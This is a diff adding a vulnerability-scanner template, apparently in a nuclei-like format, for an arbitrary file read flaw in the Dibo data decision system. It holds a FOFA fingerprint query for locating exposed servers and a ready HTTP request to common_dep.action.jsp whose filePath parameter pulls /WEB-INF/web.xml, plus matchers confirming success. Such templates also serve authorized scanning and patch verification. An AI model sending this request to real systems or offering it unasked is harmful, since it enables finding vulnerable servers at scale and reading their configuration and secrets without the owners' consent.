@@ -1,0 +1,19 @@
+## id: VEID-2025-1206
+## name: 迪博数据决策系统downloadImpTemplet存在任意文件读取
+## author: hack007x
+## severity: medium
+## tags: veid,file,veid2025
+## description: 该漏洞出现在/common/dep/common_dep.action.jsp的filePath参数中通过../等路径遍历手段绕过限制,从而导致任意文件读取
+## fofa-query: body="common/dep/dep/Core.js"
+## verification: true
+
+
+GET /common/dep/common_dep.action.jsp?action=downloadImpTemplet&filePath=/WEB-INF/web.xml&fileName=veil HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "download"
+#@ matcher: body contains "<?xml"
+
